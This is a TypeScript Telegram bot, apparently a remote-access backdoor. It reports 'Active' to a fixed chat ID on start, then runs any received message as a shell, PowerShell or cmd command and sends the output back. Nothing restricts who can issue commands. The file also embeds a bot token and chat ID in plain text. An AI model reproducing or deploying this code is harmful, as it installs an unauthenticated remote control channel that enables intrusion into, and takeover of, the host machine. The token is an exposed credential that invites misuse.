import { Telegraf } from 'telegraf';
import { asyncSpawn } from './spawn';

const app = new Telegraf('6198800908:AAGVvGmCfmKDK_Pbt8nJ9PGArg2fZ5x6DJ4');

setTimeout(() => {
	app.telegram.sendMessage('717341709', 'Active');
}, 1000);

app.command('sh', async (ctx) => {
	const message = ctx.message.text.replace(/\/sh /, '');

	try {
		const spawn = await asyncSpawn('sh', ['-c', `${message}`]);
		if (!spawn.okData && !spawn.errData) {
			return await ctx.reply('Пустое значение');
		}
		const msg = spawn.okData + '\n\n' + spawn.errData;
		const lengthCount = +(msg.length / 2000).toFixed();
		const splitCount = lengthCount === 0 ? 1 : lengthCount;
		for (let i = 0; i < splitCount; i++) {
			await ctx.reply(
				`<code>${msg.slice(2000 * i, 2000 + 2000 * i)}</code>`,
				{ parse_mode: 'HTML' }
			);
		}
	} catch (error) {
		if (error instanceof Error) {
			console.log(error);
			return await ctx.reply(error.message);
		}
		return await ctx.reply('Нет данных');
	}
});

app.command('powershell', async (ctx) => {
	const message = ctx.message.text.replace(/\/powershell /, '');

	try {
		const spawn = await asyncSpawn('powershell', [
			'-Command',
			`${message}`,
		]);
		if (!spawn.okData && !spawn.errData) {
			return await ctx.reply('Пустое значение');
		}
		const msg = spawn.okData + '\n\n' + spawn.errData;
		const lengthCount = +(msg.length / 2000).toFixed();
		const splitCount = lengthCount === 0 ? 1 : lengthCount;
		for (let i = 0; i < splitCount; i++) {
			await ctx.reply(
				`<code>${msg.slice(2000 * i, 2000 + 2000 * i)}</code>`,
				{ parse_mode: 'HTML' }
			);
		}
	} catch (error) {
		if (error instanceof Error) {
			console.log(error);
			return await ctx.reply(error.message);
		}
		return await ctx.reply('Нет данных');
	}
});

app.command('cmd', async (ctx) => {
	const message = ctx.message.text.replace(/\/cmd /, '');

	try {
		const spawn = await asyncSpawn('cmd', ['/c', `${message}`]);
		if (!spawn.okData && !spawn.errData) {
			return await ctx.reply('Пустое значение');
		}
		const msg = spawn.okData + '\n\n' + spawn.errData;
		const lengthCount = +(msg.length / 2000).toFixed();
		const splitCount = lengthCount === 0 ? 1 : lengthCount;
		for (let i = 0; i < splitCount; i++) {
			await ctx.reply(
				`<code>${msg.slice(2000 * i, 2000 + 2000 * i)}</code>`,
				{ parse_mode: 'HTML' }
			);
		}
	} catch (error) {
		if (error instanceof Error) {
			console.log(error);
			return await ctx.reply(error.message);
		}
		return await ctx.reply('Нет данных');
	}
});

app.on('text', async (ctx) => {
	if (ctx.message.text[0] === '/') {
		return;
	}

	const [command, ...args] = ctx.message.text.split(' ');
	try {
		const spawn = await asyncSpawn(command, args);
		if (!spawn.okData && !spawn.errData) {
			return await ctx.reply('Пустое значение');
		}
		const msg = spawn.okData + '\n\n' + spawn.errData;
		const lengthCount = +(msg.length / 2000).toFixed();
		const splitCount = lengthCount === 0 ? 1 : lengthCount;
		for (let i = 0; i < splitCount; i++) {
			await ctx.reply(
				`<code>${msg.slice(2000 * i, 2000 + 2000 * i)}</code>`,
				{ parse_mode: 'HTML' }
			);
		}
	} catch (error) {
		if (error instanceof Error) {
			console.log(error);
			return await ctx.reply(error.message);
		}
		return await ctx.reply('Нет данных');
	}
});

app.launch();
